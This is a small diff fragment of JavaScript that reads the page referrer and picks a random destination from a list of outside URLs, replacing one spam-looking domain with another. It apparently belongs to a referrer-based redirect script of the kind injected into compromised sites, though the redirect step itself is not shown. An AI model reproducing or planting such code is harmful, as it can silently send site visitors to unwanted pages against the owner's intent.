@@ -4,7 +4,7 @@
     	var cek = document.referrer;
 
     	var ars 	= rChoice([
-							'https://pinjam.123uver.cz/',
+							'https://lbdailynews.com/',
 							]);
 
 				function rChoice(arr) {
